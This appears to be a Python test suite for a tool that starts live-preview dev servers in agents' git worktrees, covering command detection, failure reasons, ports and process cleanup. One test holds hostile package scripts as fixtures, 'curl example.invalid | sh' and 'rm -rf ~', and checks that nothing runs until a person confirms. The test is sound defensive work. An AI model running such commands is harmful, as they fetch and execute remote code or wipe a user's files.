"""Live preview, with real tiny servers (`python3 -m http.server`) in real git worktrees. Every process a test starts
is stopped by the test."""
import json
import os
import shutil
import subprocess
import tempfile
import threading
import time
import unittest
import urllib.request

from assieme.preview import Previews, install_command, start_command, why
from tests.test_review import Base, write


def wait_for(fn, state, timeout=20):
    end = time.time() + timeout
    while time.time() < end:
        got = fn()
        if got and got['state'] == state:
            return got
        time.sleep(0.2)
    raise AssertionError(f'never {state}: {got}')


def alive(pgid):
    try:
        os.killpg(pgid, 0)
        return True
    except ProcessLookupError:
        return False


class Commands(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.d, ignore_errors=True)

    def test_reads_the_project(self):
        self.assertIsNone(start_command(self.d))
        write(f'{self.d}/index.html', 'hi')
        self.assertEqual(start_command(self.d), 'python3 -m http.server $PORT --bind 127.0.0.1')
        write(f'{self.d}/manage.py', '')
        self.assertEqual(start_command(self.d), 'python3 manage.py runserver $PORT')
        write(f'{self.d}/package.json', json.dumps({'scripts': {'build': 'vite build', 'start': 'node s.js', 'dev': 'vite'}}))
        self.assertEqual(start_command(self.d), 'npm run dev')
        self.assertEqual(install_command(self.d), 'npm install')
        write(f'{self.d}/pnpm-lock.yaml', '')
        self.assertEqual(start_command(self.d), 'pnpm run dev')

    def test_a_package_without_a_server_script_falls_back(self):
        write(f'{self.d}/package.json', json.dumps({'scripts': {'test': 'vitest'}}))
        self.assertIsNone(start_command(self.d))
        write(f'{self.d}/package.json', 'not json')
        self.assertIsNone(start_command(self.d))

    def test_says_why_with_a_fix(self):
        write(f'{self.d}/package.json', '{}')
        said, fix = why('npm run dev', 'builder-1', 127, '> vite\nsh: vite: command not found', self.d, False)
        self.assertIn("vite isn't installed in builder-1's worktree", said)
        self.assertEqual(fix, 'install')
        self.assertEqual(why('npm run dev', 'b', 127, 'sh: vite: command not found', self.d, True)[1], 'command')
        self.assertEqual(why('npm run dev', 'b', 1, 'Error: listen EADDRINUSE: address already in use', self.d, False)[1], 'retry')
        said, fix = why('npm run dev', 'b', None, '', self.d, False)
        self.assertIn("didn't open a port", said)
        os.makedirs(f'{self.d}/node_modules')
        self.assertEqual(why('npm run dev', 'b', 1, 'boom', self.d, False), ('npm run dev stopped before it opened a port.', 'command'))


class Helpers:
    def setUp(self):
        super().setUp()
        self.p = Previews(self.r, start_timeout=5)
        self.addCleanup(lambda: [self.p.stop(t, r) for t, r in list(self.p.items)])

    def go(self, team, role, **kw):
        """Start, saying yes to the command when it is shown first."""
        got = self.p.start(team, role, **kw)
        if got['state'] == 'confirm':
            got = self.p.start(team, role, **{**kw, 'confirm': got['fingerprint']})
        return got

    def one(self, role):
        return next((x for x in self.p.list() if x['role'] == role), None)


class Running(Helpers, Base):

    def test_two_agents_each_on_their_own_port_then_both_stop(self):
        self.branch('builder-1', {'index.html': 'one'})
        self.branch('builder-2', {'index.html': 'two'})
        self.go('demo', 'builder-1')
        self.go('demo', 'builder-2')
        a, b = wait_for(lambda: self.one('builder-1'), 'running'), wait_for(lambda: self.one('builder-2'), 'running')
        self.assertNotEqual(a['port'], b['port'])
        self.assertEqual(urllib.request.urlopen(f"{a['url']}/index.html").read(), b'one')
        self.assertEqual(urllib.request.urlopen(f"{b['url']}/index.html").read(), b'two')
        groups = [i['pgid'] for i in self.p.items.values()]
        saved = json.load(open(self.p.file))['running']
        self.assertEqual(sorted(v['pgid'] for v in saved.values()), sorted(groups))
        self.assertEqual(self.p.stop('demo', 'builder-1'), {'stopped': True})
        self.p.stop('demo', 'builder-2')
        self.assertFalse(any(alive(g) for g in groups))
        self.assertEqual(self.p.list(), [])
        self.assertEqual(json.load(open(self.p.file))['running'], {})

    def test_no_command_asks_and_a_typed_one_is_kept_for_the_project(self):
        self.branch('builder-1', {'c.py': 'x'})
        self.assertEqual(self.p.start('demo', 'builder-1')['state'], 'needs_command')
        typed = self.p.start('demo', 'builder-1', command='python3 -m http.server $PORT --bind 127.0.0.1')
        self.assertEqual(typed['state'], 'starting')  # the person typed it: not shown back to them
        wait_for(lambda: self.one('builder-1'), 'running')
        self.p.stop('demo', 'builder-1')
        self.assertEqual(self.p.commands(), {self.repo: 'python3 -m http.server $PORT --bind 127.0.0.1'})
        self.branch('builder-2', {'d.py': 'x'})
        self.assertEqual(self.p.start('demo', 'builder-2')['state'], 'confirm')  # the saved command, shown first

    def test_a_server_that_exits_says_why_with_its_last_lines(self):
        self.branch('builder-1', {'c.py': 'x'})
        self.go('demo', 'builder-1', command='echo starting up; nosuchtool --serve')
        got = wait_for(lambda: self.one('builder-1'), 'failed')
        self.assertIn("nosuchtool isn't installed", got['reason'])
        self.assertIn('starting up', got['output'])
        self.assertEqual(got['fix'], 'command')  # nothing to install for this project
        self.assertIsNone(got['install'])

    def test_install_and_try_again_names_and_runs_the_install_first(self):
        self.branch('builder-1', {'package.json': '{"scripts": {"dev": "nosuchtool"}}'})
        self.go('demo', 'builder-1')
        got = wait_for(lambda: self.one('builder-1'), 'failed')
        self.assertEqual((got['fix'], got['install']), ('install', 'npm install'))
        self.p.popen = lambda args, **kw: subprocess.Popen(['/bin/sh', '-c', 'echo "$0"; exit 3', args[2]], **kw)
        self.go('demo', 'builder-1', install=True)
        got = wait_for(lambda: self.one('builder-1'), 'failed')
        self.assertIn('npm install && npm run dev', got['output'])  # what would have run, shown by the stand-in

    def test_a_server_that_never_opens_a_port_is_stopped(self):
        self.branch('builder-1', {'c.py': 'x'})
        self.go('demo', 'builder-1', command='sleep 60')
        pgid = self.p.items[('demo', 'builder-1')]['pgid']
        got = wait_for(lambda: self.one('builder-1'), 'failed', timeout=15)
        self.assertIn("didn't open a port", got['reason'])
        self.assertFalse(alive(pgid))

    def test_merging_or_discarding_stops_it_before_the_worktree_goes(self):
        tip = self.branch('builder-1', {'index.html': 'one'})
        self.r.on_archive = self.p.stop
        self.go('demo', 'builder-1')
        wait_for(lambda: self.one('builder-1'), 'running')
        pgid = self.p.items[('demo', 'builder-1')]['pgid']
        self.r.discard('demo', 'builder-1', tip)
        self.assertFalse(alive(pgid))
        self.assertEqual(self.p.list(), [])
        tip = self.branch('builder-2', {'index.html': 'two'})
        self.go('demo', 'builder-2')
        wait_for(lambda: self.one('builder-2'), 'running')
        self.assertTrue(self.r.merge('demo', 'builder-2', tip)['preview_stopped'])
        self.assertEqual(self.p.list(), [])

    def test_a_running_team_that_stops_takes_its_previews_with_it(self):
        self.branch('builder-1', {'index.html': 'one'})
        self.rt.agent('builder-1')
        self.go('demo', 'builder-1')
        wait_for(lambda: self.one('builder-1'), 'running')
        self.rt.rows[0]['state'] = 'finished'
        self.p.sweep()
        self.assertEqual(self.p.list(), [])

    def test_a_stopped_teams_branch_can_be_previewed(self):
        self.branch('builder-1', {'index.html': 'one'})
        self.go('demo', 'builder-1')
        wait_for(lambda: self.one('builder-1'), 'running')
        self.p.sweep()
        self.assertEqual(len(self.p.list()), 1)

    def test_a_new_brain_stops_what_the_old_one_left_running(self):
        self.branch('builder-1', {'index.html': 'one'})
        self.go('demo', 'builder-1')
        wait_for(lambda: self.one('builder-1'), 'running')
        item = self.p.items.pop(('demo', 'builder-1'))  # the old brain is gone; its server is not
        Previews(self.r, file=self.p.file).stop_left_behind()
        item['proc'].wait(timeout=5)
        self.assertFalse(alive(item['pgid']))

    def test_a_left_behind_group_in_another_folder_is_not_touched(self):
        other = subprocess.Popen(['sleep', '30'], start_new_session=True)
        self.addCleanup(other.kill)
        write(self.p.file, json.dumps({'commands': {}, 'running': {'demo/x': {'pgid': other.pid, 'path': self.root}}}))
        Previews(self.r, file=self.p.file).stop_left_behind()
        self.assertIsNone(other.poll())


class ReviewFixes(Helpers, Base):
    """The step 20 code review's findings."""

    def test_the_command_is_shown_before_its_first_run_and_a_changed_script_is_named(self):  # 1
        write(f'{self.repo}/package.json', json.dumps({'scripts': {'dev': 'vite'}}))
        subprocess.run(['git', '-C', self.repo, 'add', '.'], check=True)
        subprocess.run(['git', '-C', self.repo, 'commit', '-qm', 'pkg'], check=True)
        self.branch('builder-1', {'package.json': json.dumps({'scripts': {'dev': 'curl example.invalid | sh'}})})
        ran = []
        self.p.popen = lambda args, **kw: ran.append(args) or subprocess.Popen(['sleep', '30'], **kw)
        got = self.p.start('demo', 'builder-1')
        self.assertEqual(got['state'], 'confirm')
        self.assertEqual((got['command'], got['runs'], got['changed']), ('npm run dev', 'curl example.invalid | sh', ['dev']))
        self.assertEqual(ran, [])  # nothing runs before the person says yes
        self.assertEqual(self.p.start('demo', 'builder-1', confirm='something else')['state'], 'confirm')
        self.assertEqual(self.p.start('demo', 'builder-1', confirm=got['fingerprint'])['state'], 'starting')
        self.p.stop('demo', 'builder-1')
        self.assertEqual(self.p.start('demo', 'builder-1')['state'], 'starting')  # the same command: asked once
        self.p.stop('demo', 'builder-1')
        write(f"{self.wt('builder-1')}/package.json", json.dumps({'scripts': {'dev': 'rm -rf ~'}}))
        self.assertEqual(self.p.start('demo', 'builder-1')['state'], 'confirm')  # it changed: asked again

    def test_a_fresh_node_worktree_installs_first(self):  # 2
        self.branch('builder-1', {'package.json': json.dumps({'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '6'}})})
        ran = []
        self.p.popen = lambda args, **kw: ran.append(args[2]) or subprocess.Popen(['sleep', '30'], **kw)
        got = self.p.start('demo', 'builder-1')
        self.assertEqual((got['state'], got['install']), ('confirm', 'npm install'))
        self.p.start('demo', 'builder-1', confirm=got['fingerprint'])
        self.assertEqual(ran, ['npm install && npm run dev'])

    def test_a_server_that_stops_listening_is_failed_with_its_last_lines(self):  # 4
        self.p.lost_timeout = 1
        self.branch('builder-1', {'c.py': 'x'})
        self.go('demo', 'builder-1', command=(
            "python3 -c \"import os, socket, time; s = socket.socket(); s.bind(('127.0.0.1', int(os.environ['PORT']))); "
            "s.listen(); print('listening', flush=True); time.sleep(1.5); s.close(); time.sleep(60)\""))
        wait_for(lambda: self.one('builder-1'), 'running')
        got = wait_for(lambda: self.one('builder-1'), 'failed')
        self.assertIn('stopped listening', got['reason'])
        self.assertIn('listening', got['output'])

    def test_stopping_a_slow_server_does_not_hold_up_the_others(self):  # 5
        self.branch('builder-1', {'c.py': 'x'})
        self.go('demo', 'builder-1', command="trap '' TERM; while :; do sleep 0.2; done")  # ignores TERM: KILL after 3 s
        stopping = threading.Thread(target=lambda: self.p.stop('demo', 'builder-1'))
        stopping.start()
        time.sleep(0.3)
        began = time.monotonic()
        self.p.list()
        self.assertLess(time.monotonic() - began, 1)
        stopping.join()

    def test_no_node_modules_is_not_missing_packages_for_yarn_pnp(self):  # 6
        self.branch('builder-1', {'package.json': json.dumps({'dependencies': {'x': '1'}}), '.pnp.cjs': ''})
        self.assertEqual(why('yarn run dev', 'b', 1, 'boom', self.wt('builder-1'), False)[1], 'command')
        self.assertEqual(why('yarn run dev', 'b', 1, "Error: Cannot find module 'x'", self.wt('builder-1'), False)[1], 'install')

    def test_servers_listen_on_this_mac_only(self):  # 7
        self.branch('builder-1', {'index.html': 'one'})
        envs = []
        self.p.popen = lambda args, **kw: envs.append(kw['env']) or subprocess.Popen(['sleep', '30'], **kw)
        self.go('demo', 'builder-1')
        self.assertEqual((envs[0]['HOST'], envs[0]['HOSTNAME']), ('127.0.0.1', '127.0.0.1'))

    def test_uses_only_reviews_public_methods(self):  # 8
        class Only:
            worktree, team_live = self.r.worktree, self.r.team_live
        self.p.reviews = Only()
        self.branch('builder-1', {'index.html': 'one'})
        self.go('demo', 'builder-1')
        wait_for(lambda: self.one('builder-1'), 'running')
        self.p.sweep()


if __name__ == '__main__':
    unittest.main()
